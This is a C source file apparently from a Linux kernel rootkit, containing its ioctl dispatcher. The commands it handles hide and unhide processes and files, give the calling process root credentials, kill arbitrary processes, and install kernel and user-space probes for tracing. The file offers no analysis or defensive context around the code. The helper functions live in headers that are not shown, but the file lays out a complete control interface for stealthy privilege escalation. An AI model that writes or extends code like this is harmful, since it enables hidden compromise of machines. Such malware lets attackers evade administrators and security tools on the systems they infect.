#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/mm.h>
#include <linux/version.h>
#include "jky_ioctl.h"
#include "ioctl_handler.h"
#include "hooks.h"
#include "cred_escalate.h"
#include "trace.h"

static int handle_kill(struct jky_req *req) {
    struct pid *p = find_get_pid(req->pid);
    if (!p) return -ESRCH;
    struct task_struct *t = get_pid_task(p, PIDTYPE_PID);
    put_pid(p);
    if (!t) return -ESRCH;
    send_sig(SIGKILL, t, 1);
    put_task_struct(t);
    return 0;
}

long jky_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    (void)f;
    struct jky_req req;
    struct jky_trace_req treq;
    void __user *uarg = (void __user *)arg;

    switch (cmd) {
    case JKY_CMD_PING:
        return 0x4a4b59;

    case JKY_CMD_HIDE_PID:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        return jky_hide_pid(req.pid);

    case JKY_CMD_UNHIDE_PID:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        return jky_unhide_pid(req.pid);

    case JKY_CMD_HIDE_FILE:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        req.path[sizeof(req.path) - 1] = 0;
        return jky_hide_file(req.path);

    case JKY_CMD_UNHIDE_FILE:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        req.path[sizeof(req.path) - 1] = 0;
        return jky_unhide_file(req.path);

    case JKY_CMD_GET_ROOT:
        return jky_get_root();

    case JKY_CMD_KILL_PID:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        return handle_kill(&req);

    case JKY_CMD_READ_MEM:
    case JKY_CMD_WRITE_MEM:
        return -EOPNOTSUPP;

    case JKY_CMD_KPROBE_ADD:
        if (copy_from_user(&treq, uarg, sizeof(treq))) return -EFAULT;
        treq.symbol[sizeof(treq.symbol) - 1] = 0;
        return jky_kprobe_add(treq.symbol);

    case JKY_CMD_KPROBE_REMOVE:
        if (copy_from_user(&treq, uarg, sizeof(treq))) return -EFAULT;
        return jky_kprobe_remove(treq.id);

    case JKY_CMD_UPROBE_ADD:
        if (copy_from_user(&treq, uarg, sizeof(treq))) return -EFAULT;
        treq.path[sizeof(treq.path) - 1] = 0;
        return jky_uprobe_add(treq.path, treq.offset);

    case JKY_CMD_UPROBE_REMOVE:
        if (copy_from_user(&treq, uarg, sizeof(treq))) return -EFAULT;
        return jky_uprobe_remove(treq.id);

    case JKY_CMD_TRACE_READ: {
        if (copy_from_user(&treq, uarg, sizeof(treq))) return -EFAULT;
        void __user *dst = (void __user *)(uintptr_t)treq.offset;
        return jky_trace_read(dst, treq.max_events);
    }

    case JKY_CMD_TRACE_CLEAR:
        return jky_trace_clear();

    case JKY_CMD_TRACE_LIST: {
        if (copy_from_user(&treq, uarg, sizeof(treq))) return -EFAULT;
        void __user *dst = (void __user *)(uintptr_t)treq.offset;
        return jky_trace_list(dst, treq.max_events);
    }

    default:
        return -EINVAL;
    }
}
